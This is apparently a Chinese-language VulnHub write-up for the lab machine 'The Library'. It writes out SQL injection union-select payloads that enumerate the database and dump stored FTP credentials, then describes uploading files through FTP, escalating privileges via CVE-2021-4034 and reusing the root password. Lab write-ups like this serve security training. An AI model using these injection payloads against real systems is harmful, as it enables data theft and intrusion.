+++
title = '0x044 The Library'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'vulnhub'
+++



# 端口扫描

![](/vulnhub_img/WEBRESOURCE9c8d1650c99445ba77eee28ab1e630d7截图.png)

![](/vulnhub_img/WEBRESOURCE433b5413969bf70ace6a7cf4db8f7bb9截图.png)

![](/vulnhub_img/WEBRESOURCEf4a0837874780ad099a5c1f6841754bd截图.png)

# 渗透

无匿名登录：

![](/vulnhub_img/WEBRESOURCEbdb2ca5cd78a55cb2b03a798a3e4cf0c截图.png)

然后看了一下80端口，这里有个坑点，也是没有发现sql注入的原因：

这里的payload是：{"lastviewed"=="Netherlands"}

得改成"{"lastviewed"=="'Netherlands'"}“才能正常执行功能

![](/vulnhub_img/WEBRESOURCEc9831f543ab8228a06efac4a00d350b9image.png)

![](/vulnhub_img/WEBRESOURCE62cff9ecb3c3f46cc68c730e86b322d3image.png)

后续就是手动注入：

查看版本

"{"lastviewed"=="'Netherlands'union select version();#"}"

![](/vulnhub_img/WEBRESOURCE9a363c8b7c0edf8bab6fb1b034aa90f0image.png)

判断回显："{"lastviewed"=="'Nethe11rlands'union select 1;#"}"

![](/vulnhub_img/WEBRESOURCE74d76e2f3253fe7c6299e9f63735810aimage.png)

"{"lastviewed"=="'Nethe11rlands'union select group_concat(database()) ;#"}"

查询到当前数据库为library:

![](/vulnhub_img/WEBRESOURCEf67775b0021f27fa6c9d96f7f8f41d10image.png)

"{"lastviewed"=="'Nethe11rlands'union select group_concat(table_name) from information_schema.tables where table_schema='library'#"}"

查询到当前数据库下有两个表：access,countries

![](/vulnhub_img/WEBRESOURCEe41ee384393586dada13e2660dcae22aimage.png)

查看access表里面的列名：

"{"lastviewed"=="'Nethe11rlands'union select group_concat(column_name) from information_schema.columns where table_name='access' #"}"

id,service,username,password

![](/vulnhub_img/WEBRESOURCEedf2be4d328bd9071e1e1f0acdcbe9e5image.png)

查询账号密码：

"{"lastviewed"=="'Nethe11rlands'union select group_concat('\n',id,'\n',service,'\n',username,'\n',password) from access #"}"

1

ftp

globus

AroundTheWorld

![](/vulnhub_img/WEBRESOURCEb4d0b61ff88eb911a1153974da677af0image.png)

成功连接FTP，ls发现具有html写入权限：

![](/vulnhub_img/WEBRESOURCE0593b45ff304b1c68c34895a2760d4dcimage.png)

这里最好别用echo，都是kaili里面，还是用vim吧：

![](/vulnhub_img/WEBRESOURCEd52f93a000de7f6f52a8f3507fd40f71image.png)

# 提权

2021-4034：

![](/vulnhub_img/WEBRESOURCE0739a45adf913c8b62cc72f789d3d79aimage.png)

还有一种提权方式：root密码是password，和数据库密码一样